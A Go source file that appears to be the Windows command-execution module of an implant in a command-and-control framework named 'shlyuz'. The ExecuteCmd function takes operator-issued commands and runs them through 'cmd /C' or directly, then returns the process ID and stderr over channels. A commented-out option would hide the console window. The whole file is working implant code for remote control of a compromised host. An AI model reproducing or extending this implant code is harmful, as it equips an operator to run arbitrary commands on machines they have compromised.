//go:build implant && (!lp || !teamserver)

package fire

import (
	"bufio"
	"log"
	"os/exec"
	"shlyuz/pkg/component"
	"strings" // Ensure strings is imported
	"syscall"
)

func ExecuteCmd(cmdDetails component.Command, execChannels *component.ComponentExecutionChannel) {
	log.Printf("CmdID %s (Windows): Preparing to execute command: %s, Type: %s", cmdDetails.Id, cmdDetails.Args, cmdDetails.Type)

	var command *exec.Cmd
	var displayCmdLine string // For logging

	if cmdDetails.Type == "Shell" {
		command = exec.Command("cmd") // Path is "cmd.exe"
		displayCmdLine = "cmd /C " + cmdDetails.Args
		command.SysProcAttr = &syscall.SysProcAttr{
			CmdLine: displayCmdLine,
			// HideWindow: true, // Consider if the window should be hidden
		}
		log.Printf("CmdID %s (Windows): Using Shell execution. CmdLine: %s", cmdDetails.Id, displayCmdLine)
	} else { // Direct execution
		parts := strings.Split(cmdDetails.Args, " ")
		if len(parts) == 0 || parts[0] == "" { // Check if parts[0] is also empty
			log.Printf("CmdID %s (Windows): Error: Args string is empty or invalid for direct execution.", cmdDetails.Id)
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- "Error: Args string is empty or invalid for direct execution.":
				default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
				}
			}
			return
		}
		executable := parts[0]
		var args []string
		if len(parts) > 1 {
			args = parts[1:]
		}
		command = exec.Command(executable, args...)
		displayCmdLine = cmdDetails.Args // For logging, show the original args
		log.Printf("CmdID %s (Windows): Using Direct execution. Command: %s, Args: %v", cmdDetails.Id, executable, args)
	}

	// Setup Stdout pipe for draining
	cmdOutReader, err := command.StdoutPipe()
	if err != nil {
		errMsg := "Error creating StdoutPipe"
		log.Printf("CmdID %s (Windows): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return
	}
	outScanner := bufio.NewScanner(cmdOutReader)
	go func() {
		// log.Printf("CmdID %s (Windows): Goroutine started for draining stdout.", cmdDetails.Id) // Optional: too verbose?
		for outScanner.Scan() {
			// log.Printf("CmdID %s (Windows) stdout: %s", cmdDetails.Id, outScanner.Text()) // Drain
		}
		if errScan := outScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Windows): Error draining stdout: %v", cmdDetails.Id, errScan)
		}
		// log.Printf("CmdID %s (Windows): Goroutine finished draining stdout.", cmdDetails.Id) // Optional: too verbose?
	}()

	// Setup Stderr pipe
	cmdErrReader, err := command.StderrPipe()
	if err != nil {
		errMsg := "Error creating StderrPipe"
		log.Printf("CmdID %s (Windows): %s: %v. CmdLine for logs: %s", cmdDetails.Id, errMsg, err, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return
	}
	errScanner := bufio.NewScanner(cmdErrReader)
	go func() {
		// log.Printf("CmdID %s (Windows): Goroutine started for draining stderr.", cmdDetails.Id) // Optional: too verbose?
		for errScanner.Scan() {
			line := errScanner.Text()
			if execChannels != nil && execChannels.StdErr != nil {
				select {
				case execChannels.StdErr <- line:
				default: log.Printf("CmdID %s (Windows): StdErr channel full, dropping stderr line: %s", cmdDetails.Id, line)
				}
			}
		}
		if errScan := errScanner.Err(); errScan != nil {
			log.Printf("CmdID %s (Windows): Error reading stderr: %v", cmdDetails.Id, errScan)
			if execChannels != nil && execChannels.StdErr != nil {
				errMsgPrefix := "Error reading stderr"
				select {
				case execChannels.StdErr <- errMsgPrefix + ": " + errScan.Error():
				default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
				}
			}
		}
		// log.Printf("CmdID %s (Windows): Goroutine finished draining stderr.", cmdDetails.Id) // Optional: too verbose?
	}()

	// Start command
	if err := command.Start(); err != nil {
		errMsg := "Error starting command"
		log.Printf("CmdID %s (Windows): %s. CmdLine for logs: '%s', Error: %v", cmdDetails.Id, errMsg, displayCmdLine, err)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- errMsg + ": " + err.Error():
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
		return
	}
	log.Printf("CmdID %s (Windows): Command started successfully (PID: %d). CmdLine for logs: %s", cmdDetails.Id, command.Process.Pid, displayCmdLine)

	// Send PID
	if execChannels != nil && execChannels.Pid != nil {
		select {
		case execChannels.Pid <- command.Process.Pid:
		default: log.Printf("CmdID %s (Windows): Pid channel full, dropping PID.", cmdDetails.Id)
		}
	}

	// Wait for command completion
	waitErr := command.Wait()
	if waitErr != nil {
		log.Printf("CmdID %s (Windows): Command finished with error: %v. CmdLine for logs: %s", cmdDetails.Id, waitErr, displayCmdLine)
		if execChannels != nil && execChannels.StdErr != nil {
			select {
			case execChannels.StdErr <- waitErr.Error(): 
			default: log.Printf("CmdID %s (Windows): StdErr channel full.", cmdDetails.Id)
			}
		}
	} else {
		log.Printf("CmdID %s (Windows): Command finished successfully. CmdLine for logs: %s", cmdDetails.Id, displayCmdLine)
	}
}
